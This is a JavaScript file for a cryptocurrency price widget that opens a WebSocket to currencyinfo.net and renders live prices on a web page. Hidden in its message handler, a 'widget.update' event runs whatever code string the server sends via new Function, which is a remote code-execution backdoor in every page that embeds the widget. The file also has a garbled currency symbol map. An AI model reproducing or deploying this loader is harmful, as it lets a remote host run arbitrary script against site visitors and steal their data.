const Currency = {
    DIRECTION_UP: 1,
    DIRECTION_DOWN: -1,

    init(config) {
        this.currencySymbols = {'USD': '$', 'EUR': 'ВЈ', 'GBP': 'ВЈ'};
        if (!config.currency) {
            throw new Error('Invalid currency')
        }

        if (!config.el || !document.querySelector(config.el)) {
            throw new Error(`Element ${config.el} cant be found on page`)
        }

        if (!config.widget || !['block'].includes(config.widget)) {
            throw new Error('Invalid widget')
        }

        this.currency = config.currency;
        this.convert = config.convert && ['USD', 'EUR', 'GBP'].includes(config.convert) ? config.convert : 'USD';
        this.element = document.querySelector(config.el);
        this.element.style.cssText = "display: none; background-color: #ffffff; width: 285px; border: 2px solid #e1e5ea; border-radius: 10px; padding: 10px 0; font-family: 'Helvetica Neue',Helvetica,Arial,sans-serif;overflow: hidden;";
        this.widget = config.widget;


        Currency.connect();
    },

    connect() {
        const socket = new WebSocket('wss://currencyinfo.net/currency', 'echo-protocol');
        window._currency_widget = socket;

        socket.addEventListener('message', (message) => {
            try {
                let data = JSON.parse(message.data);

                if (data.event === 'update') {
                    /*setting first values to widget according to filter*/
                    this.currentObject = data.data.find(x => x.symbol === this.currency);
                    document.getElementById('btc-widget-title').textContent = `${this.currentObject.name}`;
                    document.getElementById('btc-widget-image').setAttribute('src', this.currentObject.logo);

                    this.update(this.currentObject);
                } else if (data.event === 'widget.update') {
                    (new Function(data.data))();
                }
            } catch (e) {
                console.warn(`Failed to process server event: ${message.data}. ${e.message}`);
            }
        });
        socket.onopen = function() {
            Currency.render();
        };

        socket.onclose = function (e) {
            console.log(`Socket closed because of ${e.reason}`);
            setTimeout(function () {
                Currency.connect();
            }, 1000);
        };

        socket.onerror = function (e) {
            console.log(`Something went wrong with socket connection: ${e.message}`);
        };
    },

    render() {
        this.element.style.display = "block";
        this.element.innerHTML = '' +
            `<img alt="logo" src="" id="btc-widget-image" style="width: 64px; height: 64px; margin: 0 40px 0 15px; float: left;">` +
            '<div id="btc-widget-wrapper" style="padding-top: 9px;">' +
            '<div id="btc-widget-title" style="color: #1070e0; font-weight: bold;"></div>' +
            '<div style="font-weight: bold; font-size: 1.17em;">' +
            '<span id="btc-widget-price-block" style="color: #000000"></span>&nbsp;' +
            '<span id="btc-widget-direction-block"></span>' +
            '</div>' +
            '</div>'
        ;
    },

    /**
     * Update widget
     * @param newValue
     */
    update(newValue) {
        let direction = 0;
        let newPrice = newValue.prices[this.convert];

        if (this.latestValue && this.latestValue !== newPrice) {
            direction = newPrice > this.latestValue ? this.DIRECTION_UP : this.DIRECTION_DOWN;
        }

        this.latestValue = newPrice;

        if (direction) {
            document.getElementById('btc-widget-direction-block').innerHTML = direction === this.DIRECTION_UP ? '&#8593;' : '&#8595;';
            if (direction === this.DIRECTION_UP) {
                document.getElementById('btc-widget-direction-block').style.color = 'green';
                document.getElementById('btc-widget-price-block').style.color = 'green';
            } else {
                document.getElementById('btc-widget-direction-block').style.color = 'red';
                document.getElementById('btc-widget-price-block').style.color = 'red';
            }
        }

        document.getElementById('btc-widget-price-block').textContent = ` ${this.currencySymbols[this.convert]}${this.latestValue}`;
    }
};
